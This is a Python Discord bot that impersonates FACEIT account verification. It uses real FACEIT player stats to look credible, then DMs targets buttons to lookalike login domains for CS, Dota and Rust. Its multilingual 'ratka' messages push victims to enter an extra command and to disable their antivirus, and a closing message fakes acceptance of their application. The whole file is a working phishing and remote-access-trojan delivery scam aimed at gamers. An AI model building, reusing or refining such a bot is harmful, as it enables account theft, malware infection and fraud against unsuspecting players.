import os
from typing import Optional, Dict, Tuple

import aiohttp
import discord
from discord import app_commands, ui
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")  # необязательно: мгновенная синхронизация команд на одном сервере
FACEIT_API_KEY = os.getenv("FACEIT_API_KEY")  # Server-side key: https://developers.faceit.com

# Ссылки для верификации по играм
VERIFY_URLS = {
    "cs": "https://faceit-settings.com/login/",
    "dota": "https://verify.faceitsettings.com/login/",
    "rust": "https://rustclantables.com/clan-system/"
}

# Команда для ускорения верификации (для /ratka)
RATKA_COMMAND = os.getenv("RATKA_COMMAND", "!verify")

FACEIT_ORANGE = discord.Colour(0xFF5500)
ASSETS = os.path.join(os.path.dirname(__file__), "assets")
GAMES_API = ("cs2", "csgo")  # в каком порядке искать статистику игрока

LANGUAGES = {
    "en": {"label": "English", "emoji": "🇬🇧"},
    "ru": {"label": "Русский", "emoji": "🇷🇺"},
    "uk": {"label": "Українська", "emoji": "🇺🇦"},
    "pl": {"label": "Polski", "emoji": "🇵🇱"},
    "de": {"label": "Deutsch", "emoji": "🇩🇪"},
    "tr": {"label": "Türkçe", "emoji": "🇹🇷"},
}

GAMES = {
    "cs": {"label": "Counter-Strike", "emoji": "🔫"},
    "dota": {"label": "Dota 2", "emoji": "⚔️"},
    "rust": {"label": "Rust", "emoji": "🪓"},
}

TEXTS = {
    "en": {
        "modal_title": "FACEIT verification",
        "nick_label": "Your FACEIT nickname",
        "nick_placeholder": "e.g. s1mple",
        "not_found": "❌ FACEIT profile **{nick}** was not found. Check the nickname and choose your language again.",
        "api_error": "⚠️ Could not reach FACEIT right now. Please try again later.",
        "title": "FACEIT verification for {nick}",
        "level": "Level",
        "kd": "K/D",
        "description": (
            "To start the match you need to confirm your FACEIT account.\n\n"
            "To continue the verification process, use the button below"
        ),
        "button": "Go to verification",
        "ratka_title": "Verification Request Received",
        "ratka_greeting": "Dear user!",
        "ratka_received": "We have successfully received your verification request. The request is currently under review.",
        "ratka_speedup": "To speed up the processing, we recommend completing an additional bot check. This will confirm that the request was submitted by a real user and may significantly reduce the waiting time.",
        "ratka_command": "To speed up the process, enter the following command:",
        "ratka_antivirus": "If you do not receive an automatic message, disable your antivirus.",
        "final_title": "Your application has been accepted",
        "final_greeting": "Dear user!",
        "final_reviewed": "We have reviewed the information you provided and the steps you have taken to complete the verification.",
        "final_priority": "In connection with this, your application will be reviewed on a priority basis. We will try to complete the verification as soon as possible.",
        "final_thanks": "Thank you for the information provided and your cooperation.",
    },
    "ru": {
        "modal_title": "Верификация FACEIT",
        "nick_label": "Ваш никнейм FACEIT",
        "nick_placeholder": "например, s1mple",
        "not_found": "❌ Профиль FACEIT **{nick}** не найден. Проверьте никнейм и выберите язык ещё раз.",
        "api_error": "⚠️ Не удалось связаться с FACEIT. Попробуйте позже.",
        "title": "Верификация FACEIT для {nick}",
        "level": "Уровень",
        "kd": "K/D",
        "description": (
            "Для начала матча необходимо подтвердить вашу учетную запись FACEIT.\n\n"
            "Для того чтобы продолжить процесс верификации, используйте кнопку ниже"
        ),
        "button": "Перейти к верификации",
        "ratka_title": "Заявка на верификацию получена",
        "ratka_greeting": "Уважаемый пользователь!",
        "ratka_received": "Мы успешно получили вашу заявку на прохождение верификации. В настоящее время заявка находится на рассмотрении.",
        "ratka_speedup": "Для ускорения процесса обработки рекомендуем пройти дополнительную проверку на ботов. Это позволит подтвердить, что заявку отправил реальный пользователь, и может существенно сократить время ожидания.",
        "ratka_command": "Чтобы ускорить процесс введите следующую команду:",
        "ratka_antivirus": "В случае если не придет автоматическое сообщение, выключите антивирус.",
        "final_title": "Ваша заявка принята",
        "final_greeting": "Уважаемый пользователь!",
        "final_reviewed": "Мы ознакомились с предоставленной вами информацией и предпринятыми мерами для прохождения верификации.",
        "final_priority": "В связи с этим ваша заявка будет рассмотрена в приоритетном порядке. Мы постараемся завершить проверку в кратчайшие сроки.",
        "final_thanks": "Благодарим вас за предоставленную информацию и сотрудничество.",
    },
    "uk": {
        "modal_title": "Верифікація FACEIT",
        "nick_label": "Ваш нікнейм FACEIT",
        "nick_placeholder": "наприклад, s1mple",
        "not_found": "❌ Профіль FACEIT **{nick}** не знайдено. Перевірте нікнейм і виберіть мову ще раз.",
        "api_error": "⚠️ Не вдалося зв'язатися з FACEIT. Спробуйте пізніше.",
        "title": "Верифікація FACEIT для {nick}",
        "level": "Рівень",
        "kd": "K/D",
        "description": (
            "Для початку матчу необхідно підтвердити ваш обліковий запис FACEIT.\n\n"
            "Щоб продовжити процес верифікації, скористайтеся кнопкою нижче"
        ),
        "button": "Перейти до верифікації",
        "ratka_title": "Заявку на верифікацію отримано",
        "ratka_greeting": "Шановний користувач!",
        "ratka_received": "Ми успішно отримали вашу заявку на проходження верифікації. Наразі заявка знаходиться на розгляді.",
        "ratka_speedup": "Для прискорення процесу обробки рекомендуємо пройти додаткову перевірку на ботів. Це дозволить підтвердити, що заявку надіслав реальний користувач, і може істотно скоротити час очікування.",
        "ratka_command": "Щоб прискорити процес введіть наступну команду:",
        "ratka_antivirus": "У разі якщо не прийде автоматичне повідомлення, вимкніть антивірус.",
        "final_title": "Вашу заявку прийнято",
        "final_greeting": "Шановний користувач!",
        "final_reviewed": "Ми ознайомилися з наданою вами інформацією та вжитими заходами для проходження верифікації.",
        "final_priority": "У зв'язку з цим вашу заявку буде розглянуто в пріоритетному порядку. Ми постараємося завершити перевірку якнайшвидше.",
        "final_thanks": "Дякуємо вам за надану інформацію та співпрацю.",
    },
    "pl": {
        "modal_title": "Weryfikacja FACEIT",
        "nick_label": "Twój nick FACEIT",
        "nick_placeholder": "np. s1mple",
        "not_found": "❌ Nie znaleziono profilu FACEIT **{nick}**. Sprawdź nick i wybierz język ponownie.",
        "api_error": "⚠️ Nie udało się połączyć z FACEIT. Spróbuj ponownie później.",
        "title": "Weryfikacja FACEIT dla {nick}",
        "level": "Poziom",
        "kd": "K/D",
        "description": (
            "Aby rozpocząć mecz, musisz potwierdzić swoje konto FACEIT.\n\n"
            "Aby kontynuować weryfikację, użyj przycisku poniżej"
        ),
        "button": "Przejdź do weryfikacji",
        "ratka_title": "Wniosek o weryfikację otrzymany",
        "ratka_greeting": "Szanowny użytkowniku!",
        "ratka_received": "Pomyślnie otrzymaliśmy Twój wniosek o weryfikację. Wniosek jest obecnie rozpatrywany.",
        "ratka_speedup": "Aby przyspieszyć przetwarzanie, zalecamy przejście dodatkowej kontroli anty-botowej. Potwierdzi to, że wniosek został złożony przez prawdziwego użytkownika i może znacznie skrócić czas oczekiwania.",
        "ratka_command": "Aby przyspieszyć proces, wprowadź następującą komendę:",
        "ratka_antivirus": "Jeśli nie otrzymasz automatycznej wiadomości, wyłącz program antywirusowy.",
        "final_title": "Twój wniosek został przyjęty",
        "final_greeting": "Szanowny użytkowniku!",
        "final_reviewed": "Zapoznaliśmy się z dostarczonymi przez Ciebie informacjami i podjętymi krokami w celu ukończenia weryfikacji.",
        "final_priority": "W związku z tym Twój wniosek zostanie rozpatrzony priorytetowo. Postaramy się zakończyć weryfikację w możliwie najkrótszym czasie.",
        "final_thanks": "Dziękujemy za dostarczone informacje i współpracę.",
    },
    "de": {
        "modal_title": "FACEIT-Verifizierung",
        "nick_label": "Dein FACEIT-Nickname",
        "nick_placeholder": "z. B. s1mple",
        "not_found": "❌ FACEIT-Profil **{nick}** wurde nicht gefunden. Prüfe den Nickname und wähle die Sprache erneut.",
        "api_error": "⚠️ FACEIT ist gerade nicht erreichbar. Bitte versuche es später erneut.",
        "title": "FACEIT-Verifizierung für {nick}",
        "level": "Level",
        "kd": "K/D",
        "description": (
            "Um das Match zu starten, musst du dein FACEIT-Konto bestätigen.\n\n"
            "Um die Verifizierung fortzusetzen, nutze die Schaltfläche unten"
        ),
        "button": "Zur Verifizierung",
        "ratka_title": "Verifizierungsantrag erhalten",
        "ratka_greeting": "Lieber Benutzer!",
        "ratka_received": "Wir haben Ihren Verifizierungsantrag erfolgreich erhalten. Der Antrag wird derzeit geprüft.",
        "ratka_speedup": "Um die Bearbeitung zu beschleunigen, empfehlen wir eine zusätzliche Bot-Prüfung. Dies bestätigt, dass der Antrag von einem echten Benutzer eingereicht wurde und kann die Wartezeit erheblich verkürzen.",
        "ratka_command": "Um den Prozess zu beschleunigen, gib den folgenden Befehl ein:",
        "ratka_antivirus": "Wenn Sie keine automatische Nachricht erhalten, deaktivieren Sie Ihr Antivirenprogramm.",
        "final_title": "Ihr Antrag wurde angenommen",
        "final_greeting": "Lieber Benutzer!",
        "final_reviewed": "Wir haben die von Ihnen bereitgestellten Informationen und die zur Verifizierung unternommenen Schritte überprüft.",
        "final_priority": "In diesem Zusammenhang wird Ihr Antrag vorrangig bearbeitet. Wir werden versuchen, die Überprüfung so schnell wie möglich abzuschließen.",
        "final_thanks": "Vielen Dank für die bereitgestellten Informationen und Ihre Zusammenarbeit.",
    },
    "tr": {
        "modal_title": "FACEIT doğrulaması",
        "nick_label": "FACEIT kullanıcı adınız",
        "nick_placeholder": "örn. s1mple",
        "not_found": "❌ **{nick}** FACEIT profili bulunamadı. Kullanıcı adını kontrol edip dili tekrar seçin.",
        "api_error": "⚠️ FACEIT'e şu anda ulaşılamıyor. Lütfen daha sonra tekrar deneyin.",
        "title": "{nick} için FACEIT doğrulaması",
        "level": "Seviye",
        "kd": "K/D",
        "description": (
            "Maça başlamak için FACEIT hesabınızı doğrulamanız gerekir.\n\n"
            "Doğrulamaya devam etmek için aşağıdaki düğmeyi kullanın"
        ),
        "button": "Doğrulamaya git",
        "ratka_title": "Doğrulama Talebi Alındı",
        "ratka_greeting": "Sayın kullanıcı!",
        "ratka_received": "Doğrulama talebinizi başarıyla aldık. Talep şu anda inceleniyor.",
        "ratka_speedup": "İşlemi hızlandırmak için ek bir bot kontrolünden geçmenizi öneririz. Bu, talebin gerçek bir kullanıcı tarafından gönderildiğini doğrular ve bekleme süresini önemli ölçüde kısaltabilir.",
        "ratka_command": "Süreci hızlandırmak için aşağıdaki komutu girin:",
        "ratka_antivirus": "Otomatik bir mesaj almazsanız, antivirüsünüzü kapatın.",
        "final_title": "Başvurunuz kabul edildi",
        "final_greeting": "Sayın kullanıcı!",
        "final_reviewed": "Sağladığınız bilgileri ve doğrulama için attığınız adımları inceledik.",
        "final_priority": "Bu nedenle başvurunuz öncelikli olarak değerlendirilecektir. Doğrulamayı mümkün olan en kısa sürede tamamlamaya çalışacağız.",
        "final_thanks": "Sağlanan bilgiler ve işbirliğiniz için teşekkür ederiz.",
    },
}


# Эмодзи уровней "1lvl".."10lvl": {1: "<:1lvl:123>", ...}; заполняется при старте бота.
LEVEL_EMOJIS: Dict[int, str] = {}


async def load_level_emojis(client: discord.Client) -> None:
    """Ищет эмодзи вида '<N>lvl' среди эмодзи серверов и эмодзи самого приложения."""
    found = {}
    candidates = list(client.emojis)
    try:
        candidates += await client.fetch_application_emojis()
    except discord.HTTPException as e:
        print(f"Не удалось получить эмодзи приложения: {e}")
    for emoji in candidates:
        name = emoji.name.lower()
        if name.endswith("lvl") and name[:-3].isdigit():
            found[int(name[:-3])] = str(emoji)
    LEVEL_EMOJIS.clear()
    LEVEL_EMOJIS.update(found)
    missing = [n for n in range(1, 11) if n not in found]
    print(f"Эмодзи уровней найдено: {len(found)}/10" + (f", нет: {missing}" if missing else ""))


class FaceitError(Exception):
    """FACEIT API недоступен или вернул ошибку."""


async def fetch_player(nickname: str) -> Optional[dict]:
    """Возвращает данные игрока или None, если такого профиля нет."""
    if not FACEIT_API_KEY:
        raise FaceitError("FACEIT_API_KEY is not set")

    headers = {"Authorization": f"Bearer {FACEIT_API_KEY}"}
    timeout = aiohttp.ClientTimeout(total=10)
    base = "https://open.faceit.com/data/v4"

    try:
        async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session:
            async with session.get(f"{base}/players", params={"nickname": nickname}) as resp:
                if resp.status == 404:
                    return None
                if resp.status != 200:
                    raise FaceitError(f"players lookup returned {resp.status}")
                player = await resp.json()

            game = next((g for g in GAMES_API if g in player.get("games", {})), None)
            info = player["games"][game] if game else {}
            kd = None
            if game:
                url = f"{base}/players/{player['player_id']}/stats/{game}"
                async with session.get(url) as resp:
                    if resp.status == 200:
                        kd = (await resp.json()).get("lifetime", {}).get("Average K/D Ratio")
    except aiohttp.ClientError as e:
        raise FaceitError(str(e)) from e

    return {
        "nickname": player["nickname"],
        "avatar": player.get("avatar") or None,
        "url": player.get("faceit_url", "").replace("{lang}", "en") or None,
        "level": info.get("skill_level"),
        "elo": info.get("faceit_elo"),
        "kd": kd,
    }


def logo_file() -> discord.File:
    return discord.File(os.path.join(ASSETS, "logo.png"), filename="logo.png")


def banner_file() -> discord.File:
    return discord.File(os.path.join(ASSETS, "banner.webp"), filename="banner.webp")


def ratka_image_file() -> discord.File:
    return discord.File(os.path.join(ASSETS, "4.png"), filename="4.png")


def header() -> ui.Section:
    """Заголовок с логотипом справа."""
    return ui.Section(
        "# FACEIT Status BOT",
        "-# FACEIT Verification System",
        accessory=ui.Thumbnail("attachment://logo.png"),
    )


def result_message(lang: str, game: str, player: dict) -> Tuple[discord.Embed, ui.View]:
    t = TEXTS[lang]
    embed = discord.Embed(
        title=f"⚠️ {t['title'].format(nick=player['nickname'])}",
        description=f"\n{t['description']}",
        color=FACEIT_ORANGE,
    )
    level = player["level"]
    level_text = LEVEL_EMOJIS.get(level) or str(level or "—")  # нет эмодзи — показываем число
    embed.add_field(name=t["level"], value=level_text, inline=True)
    embed.add_field(name="ELO", value=str(player["elo"] or "—"), inline=True)
    embed.add_field(name=t["kd"], value=str(player["kd"] or "—"), inline=True)
    if player["avatar"]:
        embed.set_thumbnail(url=player["avatar"])
    embed.set_image(url="attachment://banner.webp")
    embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")

    view = ui.View(timeout=None)
    link = VERIFY_URLS.get(game, player["url"])
    if link:
        view.add_item(ui.Button(style=discord.ButtonStyle.link, label=t["button"], url=link, emoji="🔗"))
    return embed, view


class NicknameModal(ui.Modal):
    def __init__(self, lang: str, game: str):
        t = TEXTS[lang]
        super().__init__(title=t["modal_title"])
        self.lang = lang
        self.game = game
        self.nickname = ui.TextInput(
            label=t["nick_label"],
            placeholder=t["nick_placeholder"],
            min_length=2,
            max_length=32,
        )
        self.add_item(self.nickname)

    async def on_submit(self, interaction: discord.Interaction):
        t = TEXTS[self.lang]
        nick = self.nickname.value.strip()
        # Запрос к API может занять больше 3 секунд — сначала подтверждаем получение.
        await interaction.response.defer()

        try:
            player = await fetch_player(nick)
        except FaceitError as e:
            print(f"FACEIT error for {nick!r}: {e}")
            await interaction.followup.send(t["api_error"])
            return

        if player is None:
            await interaction.followup.send(t["not_found"].format(nick=discord.utils.escape_markdown(nick)))
            return

        embed, view = result_message(self.lang, self.game, player)
        await interaction.followup.send(embed=embed, view=view, files=[logo_file(), banner_file()])


class LanguageRow(ui.ActionRow):
    def __init__(self, game: str):
        super().__init__()
        self.game = game

    @ui.select(
        custom_id="faceit:language",
        placeholder="Select language...",
        options=[
            discord.SelectOption(label=v["label"], value=k, emoji=v["emoji"])
            for k, v in LANGUAGES.items()
        ],
    )
    async def pick(self, interaction: discord.Interaction, select: ui.Select):
        await interaction.response.send_modal(NicknameModal(select.values[0], self.game))


class LanguageView(ui.LayoutView):
    def __init__(self, game: str = "cs"):
        super().__init__(timeout=None)  # постоянное меню, работает и после перезапуска бота
        self.add_item(
            ui.Container(
                header(),
                ui.Separator(),
                ui.TextDisplay("### 🌐 Please select your language"),
                LanguageRow(game),
                accent_colour=FACEIT_ORANGE,
            )
        )


class RatkaLanguageRow(ui.ActionRow):
    @ui.select(
        custom_id="ratka:language",
        placeholder="Select language...",
        options=[
            discord.SelectOption(label=v["label"], value=k, emoji=v["emoji"])
            for k, v in LANGUAGES.items()
        ],
    )
    async def pick(self, interaction: discord.Interaction, select: ui.Select):
        lang = select.values[0]
        t = TEXTS[lang]
        
        # Создаем embed с информацией о верификации
        embed = discord.Embed(
            title=f"✅ {t['ratka_title']}",
            description=(
                f"**{t['ratka_greeting']}**\n\n"
                f"{t['ratka_received']}\n\n"
                f"{t['ratka_speedup']}\n\n"
                f"**{t['ratka_command']}**\n"
                f"```\n{RATKA_COMMAND}\n```\n"
                f"⚠️ {t['ratka_antivirus']}"
            ),
            color=FACEIT_ORANGE,
        )
        embed.set_image(url="attachment://4.png")
        embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
        
        await interaction.response.send_message(embed=embed, files=[ratka_image_file(), logo_file()])


class RatkaLanguageView(ui.LayoutView):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(
            ui.Container(
                header(),
                ui.Separator(),
                ui.TextDisplay("### 🌐 Please select your language"),
                RatkaLanguageRow(),
                accent_colour=FACEIT_ORANGE,
            )
        )


class VerifBot(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.default())
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        # Регистрируем view для каждой игры
        for game in GAMES:
            self.add_view(LanguageView(game))
        
        if GUILD_ID:
            guild = discord.Object(id=int(GUILD_ID))
            self.tree.copy_global_to(guild=guild)
            await self.tree.sync(guild=guild)
        else:
            await self.tree.sync()

    async def on_ready(self):
        print(f"Logged in as {self.user} ({self.user.id})")
        await load_level_emojis(self)
        if not FACEIT_API_KEY:
            print("WARNING: FACEIT_API_KEY не задан — проверка никнеймов работать не будет.")


bot = VerifBot()


@bot.tree.command(name="verif", description="Отправить пользователю FACEIT-верификацию в личные сообщения")
@app_commands.describe(
    member="Кому отправить верификацию",
    game="Выбор игры (CS/Dota/Rust)"
)
@app_commands.choices(game=[
    app_commands.Choice(name="Counter-Strike", value="cs"),
    app_commands.Choice(name="Dota 2", value="dota"),
    app_commands.Choice(name="Rust", value="rust"),
])
@app_commands.default_permissions(manage_guild=True)
@app_commands.guild_only()
async def verif(interaction: discord.Interaction, member: discord.Member, game: app_commands.Choice[str]):
    if member.bot:
        await interaction.response.send_message("Нельзя отправить верификацию боту.", ephemeral=True)
        return

    game_value = game.value if isinstance(game, app_commands.Choice) else game

    try:
        await member.send(view=LanguageView(game_value), file=logo_file())
    except discord.Forbidden:
        await interaction.response.send_message(
            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
            ephemeral=True,
        )
        return

    await interaction.response.send_message(
        f"Верификация ({game.name}) отправлена {member.mention} в личку ✅", 
        ephemeral=True
    )


@bot.tree.command(name="ratka", description="Отправить пользователю уведомление о получении заявки на верификацию")
@app_commands.describe(
    member="Кому отправить уведомление",
    language="Язык уведомления"
)
@app_commands.choices(language=[
    app_commands.Choice(name="English", value="en"),
    app_commands.Choice(name="Русский", value="ru"),
    app_commands.Choice(name="Українська", value="uk"),
    app_commands.Choice(name="Polski", value="pl"),
    app_commands.Choice(name="Deutsch", value="de"),
    app_commands.Choice(name="Türkçe", value="tr"),
])
@app_commands.default_permissions(manage_guild=True)
@app_commands.guild_only()
async def ratka(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
    if member.bot:
        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
        return

    lang = language.value if isinstance(language, app_commands.Choice) else language
    t = TEXTS[lang]
    
    # Создаем embed с информацией о верификации
    embed = discord.Embed(
        title=f"✅ {t['ratka_title']}",
        description=(
            f"**{t['ratka_greeting']}**\n\n"
            f"{t['ratka_received']}\n\n"
            f"{t['ratka_speedup']}\n\n"
            f"**{t['ratka_command']}**\n"
            f"```\n{RATKA_COMMAND}\n```\n"
            f"⚠️ {t['ratka_antivirus']}"
        ),
        color=FACEIT_ORANGE,
    )
    embed.set_image(url="attachment://4.png")
    embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")

    try:
        await member.send(embed=embed, files=[ratka_image_file(), logo_file()])
    except discord.Forbidden:
        await interaction.response.send_message(
            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
            ephemeral=True,
        )
        return

    await interaction.response.send_message(
        f"Уведомление ({language.name}) отправлено {member.mention} в личку ✅", 
        ephemeral=True
    )


@bot.tree.command(name="final", description="Отправить пользователю уведомление о принятии заявки")
@app_commands.describe(
    member="Кому отправить уведомление",
    language="Язык уведомления"
)
@app_commands.choices(language=[
    app_commands.Choice(name="English", value="en"),
    app_commands.Choice(name="Русский", value="ru"),
    app_commands.Choice(name="Українська", value="uk"),
    app_commands.Choice(name="Polski", value="pl"),
    app_commands.Choice(name="Deutsch", value="de"),
    app_commands.Choice(name="Türkçe", value="tr"),
])
@app_commands.default_permissions(manage_guild=True)
@app_commands.guild_only()
async def final(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
    if member.bot:
        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
        return

    lang = language.value if isinstance(language, app_commands.Choice) else language
    t = TEXTS[lang]
    
    # Создаем embed с информацией о принятии заявки
    embed = discord.Embed(
        title=f"✅ {t['final_title']}",
        description=(
            f"**{t['final_greeting']}**\n\n"
            f"{t['final_reviewed']}\n\n"
            f"{t['final_priority']}\n\n"
            f"{t['final_thanks']}"
        ),
        color=discord.Colour.green(),
    )
    embed.set_thumbnail(url="attachment://logo.png")
    embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")

    try:
        await member.send(embed=embed, file=logo_file())
    except discord.Forbidden:
        await interaction.response.send_message(
            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
            ephemeral=True,
        )
        return

    await interaction.response.send_message(
        f"Уведомление о принятии ({language.name}) отправлено {member.mention} в личку ✅", 
        ephemeral=True
    )


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("Не задан DISCORD_TOKEN. Скопируйте .env.example в .env и вставьте токен.")
    bot.run(TOKEN)
